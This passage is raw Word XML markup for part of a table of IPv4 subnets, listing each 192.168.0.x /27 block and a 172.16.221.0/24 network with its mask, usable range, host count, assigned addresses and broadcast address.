          <w:p w14:paraId="11F36E96" w14:textId="2CEA825B" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="42E63E91" w14:textId="7DEDD56A" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.33-62</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15FB24DC" w14:textId="62F0725E" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2893A5DB" w14:textId="512E6CD8" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.33</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EC1B9C7" w14:textId="24B10DD4" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>109.168.0.34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4900E76D" w14:textId="4E7D215D" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.63</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D500C" w:rsidRPr="00521489" w14:paraId="2F8D9049" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="659E0926" w14:textId="7D58EBFB" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.64/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7AD1E432" w14:textId="14F29974" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="612C59DC" w14:textId="06553249" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.65-94</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7D8024F6" w14:textId="2347D01C" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="018F07FA" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.65</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3816DB9E" w14:textId="0C256230" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.66</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5FF405C0" w14:textId="351F4087" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.95</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="0311A6CA" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="320F0FA8" w14:textId="799A41D8" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.96/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06D8759A" w14:textId="0C807DFD" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3924590E" w14:textId="485D98E7" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.97-126</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="42794C32" w14:textId="5BFF9D8A" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0944DBC7" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.97</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="426CF966" w14:textId="1578FB39" w:rsidR="005B4DBF" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="69A892B9" w14:textId="4630D95E" w:rsidR="00043DF1" w:rsidRPr="00521489" w:rsidRDefault="005B4DBF" w:rsidP="00043DF1">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.127</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="0CB0D9D4" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="57385638" w14:textId="71870F3D" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00043DF1" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.128/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27507D16" w14:textId="114C4945" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00043DF1" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55DB7E32" w14:textId="069C00EA" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="00043DF1" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.129-</w:t>
            </w:r>
            <w:r w:rsidR="005F04BF" w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>158</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="60852FC2" w14:textId="6DA0C73D" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005F04BF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5811ED43" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005F04BF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.129</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70861F62" w14:textId="674F2072" w:rsidR="005F04BF" w:rsidRPr="00521489" w:rsidRDefault="005F04BF" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.130</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="646EE0BF" w14:textId="27A53FA0" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="005779D1" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.159</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00FE1D7F" w:rsidRPr="00521489" w14:paraId="71C7D427" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CBD7A33" w14:textId="1BF229C1" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.192/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0C05F5E9" w14:textId="41E47685" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5BB79707" w14:textId="1C6DF6F9" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.193-222</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D29C7E7" w14:textId="78062E59" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6C63C2E8" w14:textId="77777777" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.193</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06C74E94" w14:textId="27DF78D5" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.200</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="36E6B306" w14:textId="6E9A558A" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.210</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B6EB94E" w14:textId="134C55EF" w:rsidR="00FE1D7F" w:rsidRPr="00521489" w:rsidRDefault="00FE1D7F" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.223</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E3075D" w:rsidRPr="00521489" w14:paraId="3D9923EB" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77A156B4" w14:textId="4EBA4B0D" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.0/24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1420" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="03883C8B" w14:textId="00923E69" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1274" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1C874B6F" w14:textId="421D6AF0" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.1-254</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1842" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D6597E0" w14:textId="610731F9" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>254</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1418" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58E3BDCB" w14:textId="77777777" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.16</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D8028D8" w14:textId="11E2B55C" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.237</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1700" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08ABB05A" w14:textId="3554E1AC" w:rsidR="003F20FC" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="00E54A30">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.255</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006D500C" w:rsidRPr="00521489" w14:paraId="067E9429" w14:textId="77777777" w:rsidTr="003F20FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1696" w:type="dxa"/>
          </w:tcPr>
